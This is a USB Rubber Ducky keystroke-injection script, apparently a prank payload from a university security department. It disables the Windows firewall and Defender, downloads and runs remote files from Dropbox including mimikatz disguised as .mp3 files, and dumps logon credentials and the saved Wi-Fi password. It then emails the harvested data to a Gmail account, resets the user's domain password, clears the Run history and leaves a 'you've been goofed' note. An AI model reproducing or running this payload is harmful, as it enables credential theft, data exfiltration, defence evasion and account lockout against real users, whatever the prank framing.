DELAY 1000
GUI M
DELAY 500
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 300
STRING mode con:cols=18 lines=1
ENTER
STRING color FE
ENTER
DELAY 500
STRING netsh firewall set opmode mode=disable 
DELAY 400
ENTER
STRING powershell Set-MpPreference -DisableRealtimeMonitoring $true
DELAY 500
ENTER
DELAY 400
STRING powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/352kp4lnwx6drsx/Win%20Update%20Message.bat?dl=0','%TEMP%\Message.bat') }"
DELAY 500
ENTER
DELAY 300
STRING cd %TEMP%
DELAY 300
ENTER
DELAY 300
STRING start %TEMP%\Message.bat
DELAY 300
ENTER
DELAY 300
GUI M
DELAY 500
REM Open an admin command prompt 
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 300
STRING mode con:cols=18 lines=1
ENTER
STRING color FE
ENTER
DELAY 300
STRING cd %USERPROFILE%
DELAY 400
ENTER
DELAY 400
REM --> Getting SSID
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:
DELAY 400
STRING  " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
DELAY 400
ENTER
DELAY 400
REM --> Creating A.txt
STRING netsh wlan show profiles %A% key=clear |  
DELAY 400
STRING findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
DELAY 400
ENTER
REM --> Get network type
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
DELAY 400
ENTER
DELAY 400
REM --> Get authentication
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
ENTER
DELAY 400
REM --> Get password
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
DELAY 400
ENTER
REM --> Delete A.txt
DELAY 400
STRING del A.txt
DELAY 400
ENTER
STRING cd %TEMP%
DELAY 500
ENTER
REM --> Create WIFI.txt
STRING echo SSID: %A%>>WIFI.txt & echo Network type: %B%>>WIFI.txt & echo Authentication: %C%>>WIFI.txt & echo Password: %D%>>WIFI.txt
DELAY 400
ENTER
DELAY 400
REM --> Get IPConfig /all
STRING ipconfig /all > ip.txt
DELAY 400
ENTER
REM --> Get Public IP
DELAY 500
STRING nslookup myip.opendns.com. resolver1.opendns.com > PublicIp.txt
DELAY 500
ENTER
DELAY 300
REM -------------download appropriate mimikatz for architecture
STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/8vl099fono8p49x/mimikatz32.mp3?dl=0','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/vu2l8iwfexa2h6k/mimikatz64.mp3?dl=0','%TEMP%\pw.exe');}
ENTER
DELAY 2000
REM -------------get the passwords and save to c:\pwlog.txt
STRING %TEMP%\pw.exe > c:\pwlog.txt & type c:\pwlog.txt;
ENTER
DELAY 300
STRING privilege::debug
ENTER
STRING sekurlsa::logonPasswords full
ENTER
STRING exit
ENTER
STRING del %TEMP%\pw.exe
ENTER
DELAY 500
STRING cd %TEMP%
DELAY 500
ENTER
DELAY 500
STRING powershell
ENTER
DELAY 400
STRING $SMTPServer = 'smtp.gmail.com'
DELAY 400
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
DELAY 400
ENTER
STRING $SMTPInfo.EnableSsl = $true
DELAY 400
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL@gmail.com', 'EMAIL PASSWORD');
DELAY 400
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
DELAY 400
ENTER
STRING $ReportEmail.From = 'EMAIL@gmail.com'
DELAY 400
ENTER
STRING $ReportEmail.To.Add('EMAIL@gmail.com')
DELAY 400
ENTER
STRING $ReportEmail.Subject = 'Ducky Report'
DELAY 400
ENTER
STRING $ReportEmail.Body = (Get-Content ip.txt,PublicIp.txt,WIFI.txt | out-string)
DELAY 400
ENTER
STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
DELAY 400
ENTER
DELAY 400
STRING $SMTPInfo.Send($ReportEmail)
DELAY 500
ENTER
STRING exit
ENTER
DELAY 500 
STRING del WIFI.txt
DELAY 500
ENTER
DELAY 500
STRING del PublicIp.txt
DELAY 400
ENTER
DELAY 500
STRING del ip.txt
DELAY 500
ENTER
REM ---------------------use parse_Invoke-Mimikatz by Russel Van Tuyl to find current users' password
DELAY 500
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/90czdj5yexv2gs1/dist.zip?dl=0', '%TEMP%\dist.zip')
DELAY 500
ENTER
DELAY 200
STRING powershell 
ENTER
DELAY 200
STRING Add-Type -A System.IO.Compression.FileSystem
ENTER
DELAY 200
STRING [IO.Compression.ZipFile]::ExtractToDirectory('dist.zip', 'dist')
ENTER
DELAY 200
STRING EXIT
ENTER
DELAY 200
STRING del dist.zip
ENTER
DELAY 200
STRING cd %USERPROFILE%\desktop
ENTER
DELAY 200
STRING echo Your old password is: > WRECKED.txt
ENTER
DELAY 200
STRING %TEMP%\dist\dist\parse_Invoke-MimiKatz.exe --file c:\pwlog.txt >> WRECKED.txt
ENTER
DELAY 300
STRING rmdir /S /Q %TEMP%\dist
ENTER
DELAY 300
STRING del c:\pwlog.txt
ENTER
DELAY 300
STRING echo. >> WRECKED.txt
DELAY 400
ENTER
DELAY 300
STRING net user %username% Feartheusbm8ty /domain
DELAY 300
ENTER
DELAY 300
STRING echo Your new password is: Feartheusbm8ty >> WRECKED.txt
ENTER
DELAY 300
STRING echo. >> WRECKED.txt
ENTER
STRING echo You've been goofed, this is all fake and nothing is being installed! >> WRECKED.txt
ENTER
DELAY 300
STRING echo. >> WRECKED.txt
ENTER
DELAY 300
STRING echo Please return this usb flash drive to Commputer Science and Cyber Security Department at Room 152 at Building A :) >> WRECKED.txt
ENTER
DELAY 500
STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
DELAY 500
ENTER
DELAY 500
STRING netsh firewall set opmode mode=enable
DELAY 200
ENTER
DELAY 300
STRING powershell Set-MpPreference -DisableRealtimeMonitoring $false
DELAY 300
ENTER
STRING exit
DELAY 200
ENTER
DELAY 200
REM---------------------------------------- Alan Script
GUI r
DELAY 1000
DELETE
STRING chrome
ENTER
DELAY 1000
STRING http://fakeupdate.net/windows98/index.html
ENTER
DELAY 1000
F11
DELAY 500
ENTER
DELAY 10000
ALT F4
GUI r
DELAY 500
STRING cmd
DELAY 300
ENTER
DELAY 300
STRING cd %USERPROFILE%\Desktop
DELAY 500
ENTER
STRING start notepad "WRECKED.txt"
DEALY 500
ENTER